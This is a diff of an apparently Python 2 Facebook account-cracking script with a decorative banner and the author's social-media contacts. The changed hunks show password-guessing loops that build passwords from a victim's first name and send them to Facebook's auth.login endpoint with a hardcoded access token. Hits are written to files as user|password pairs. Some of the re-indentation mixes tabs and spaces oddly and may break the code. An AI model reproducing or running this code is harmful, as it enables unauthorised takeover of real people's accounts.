@@ -80,19 +80,23 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-print  """  
- \033[1;91m\ \((_)/ / __| | ((/ __/ _ \|  \/  | __| 
-  \033[1;91m\ \/\/ /| _|| |__| (_| (_) | |\/| | _|  
-   \033[1;91m\_/\_/ |___|____|\___\___/|_|  |_|___|
+print  """
+\033[1;97m  _       __________    __________  __  _________\033[0m
+\033[1;97m | |     / / ____/ /   / ____/ __ \/  |/  / ____/\033[0m
+\033[1;97m | | /| / / __/ / /   / /   / / / / /|_/ / __/   \033[0m
+\033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
+\033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.1\033[0m
 \033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;93m๑۩۩๑\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;91mAuthor©\033[1;91m: \033[1;93mMansoor Khan
 \033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Man50or
 \033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Man50or
 \033[1;91mWhatsapp\033[1;91m: \033[1;93m+923325439914
 \033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
-jalan('              \033[1;91mREAD CAREFULLY:')
 jalan("\033[1;97m   It's not in Commands Control to get a   ")
 jalan('\033[1;97m   New or Old Account,  ')
+jalan('\033[1;97m    ok ')
+jalan("\033[1;97m    OK")
+jalan("\033[1;97m   OK .")
 print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"
 
 CorrectUsername = "KHAN"
@@ -384,9 +388,9 @@ def pilih_super():
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
-                              else:
+                                                                  else:
 									pass8 = b['first_name'] + '@@'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							  		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
 										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass8
@@ -398,7 +402,7 @@ def pilih_super():
 											cek.write(user+"|"+pass8+"\n")
 											cek.close()
 											cekpoint.append(user+pass8)
-                      else:
+                                                                 else:
 									pass9 = b['first_name'] + '1122'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
